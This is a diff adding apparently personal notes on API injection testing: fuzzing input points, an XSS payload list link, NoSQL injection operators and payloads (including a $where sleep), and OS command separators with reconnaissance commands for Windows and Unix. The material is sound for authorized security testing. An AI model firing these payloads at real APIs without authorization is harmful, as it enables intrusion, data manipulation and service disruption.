@@ -1,0 +1,84 @@
+Before you can inject a payload using an API, you must discover places
+where the API accepts user input. One way to discover these injection
+points is by fuzzing and then analyzing the responses you receive. You
+should attempt injection attacks against all potential inputs and especially
+within the following
+
+•  API keys
+•  Tokens
+•  Headers
+•  Query strings in the URL
+•  Parameters in POST/PUT requests
+
+Try to detect the backend tech and send targeted request in hopes of 
+revealing vulns that backend tech is prone to. 
+
+When you do come across a vulnerability, make sure to test every similar endpoint for that vulnerability
+
+XSS Playloads
+https://github.com/payloadbox/xss-payload-list
+
+XAS
+If the API implements input validation, the server might
+issue an HTTP 400 Bad Request response, preventing you from sending
+scripts as payloads. In that case, try using Burp Suite or Wfuzz to send a
+large list of XAS/XSS scripts in an attempt to locate some that don’t result
+in a 400 response
+
+SQL Injection, see ../Bug Classes/SQL Injection.txt
+
+
+Try providing a string where a number is expected, a number where a string is
+expected, and a number or string where a Boolean value is expected. If an
+API is expecting a small number, send a large number, and if it expects a
+small string, send a large one. 
+
+NoSQL Injection
+The following are common NoSQL meta characters you could send in
+an API call to manipulate the database:
+$gt
+{"$gt":""}
+{"$gt":-1}
+$ne
+{"$ne":""}
+{"$ne":-1}
+$nin
+{"$nin":1}
+{"$nin":[1]}
+|| '1'=='1
+//
+||'a'\\'a
+'||'1'=='1';//
+'/{}:
+'"\;{}
+'"\/$[].>
+{"$where": "sleep(1000)"}
+
+OS Command Injection 
+you’ll inject a command separator and operating system commands. When
+you’re performing operating system injection, it helps a great deal to know
+which operating system is running on the target server
+1. Find a potential injection point
+|
+||
+&
+&&
+' 
+" 
+;
+'"
+
+Operating system Command Description
+Windows 
+ipconfig    Shows the network configuration
+dir         Prints the contents of a directory
+ver         Prints the operating system and version
+echo %CD%   Prints the current working directory
+whoami      Prints the current user
+
+*nix (Linux and Unix) 
+ifconfig  Shows the network configuration
+ls        Prints the contents of a directory
+uname -a  Prints the operating system and version
+pwd       Prints the current working directory
+whoami    Prints the current user
